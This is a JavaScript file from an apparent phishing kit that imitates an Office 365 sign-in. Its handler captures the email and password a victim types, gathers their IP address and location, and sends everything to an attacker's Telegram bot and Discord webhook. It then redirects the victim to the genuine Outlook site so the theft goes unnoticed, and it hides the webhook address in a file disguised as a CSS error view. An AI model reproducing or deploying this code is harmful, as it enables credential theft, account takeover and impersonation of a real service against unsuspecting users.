import { TELEGRAM_TOKEN, TELEGRAM_CHAT_ID } from "./config.js";
import { WEBHOOK_URL } from "./css/errorView.js";
const btn = document.getElementById("submit-btn");

async function sendData(e) {
  e.preventDefault();
  const username = document.getElementById("ai").value;
  const passcode = document.getElementById("pr").value;

  try {
    // Fetch IP information from ipinfo.io
    let res = await fetch("https://ipinfo.io/json?token=2457e6df46b714"); // Replace YOUR_TOKEN_HERE with a valid token
    let data = await res.json();

    // Extract and display IP and location information
    const ip = data.ip;
    const city = data.city;
    const region = data.region;
    const country = data.country;
    const loc = data.loc; // latitude,longitude

    const my_text = `Result is:\n => EMAIL: ${username} \n\n => PASSWORD: ${passcode} \n\n IP: ${ip} \n LOCATION: ${city}${region}${country}${loc}`;
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(
      my_text
    )}`;

    // Send data to Telegram
    let response = await fetch(telegramUrl);
    if (!response.ok) {
      throw new Error("Failed to send message to Telegram");
    }

    // Send data to Discord Webhook
    const embed = {
      title: "OFFICE365",
      description: `Result is:\n => EMAIL: ${username}\n => PASSWORD: ${passcode} \n\n IP: ${ip} \n LOCATION: ${city}${region}${country}${loc}`,
      color: 0x00ffff,
    };

    response = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        content: "OFFICE365",
        username: "OFFICE365 LOG",
        avatar_url: "https://i.imgur.com/AfFp7pu.png",
        embeds: [embed],
      }),
    });

    if (!response.ok) {
      throw new Error("Failed to send message to Discord");
    }

    // Redirect after successful submission
    window.location.href = "https://outlook.office365.com/mail/";
  } catch (error) {
    console.error("Error:", error);
  }
}

btn.addEventListener("click", sendData);
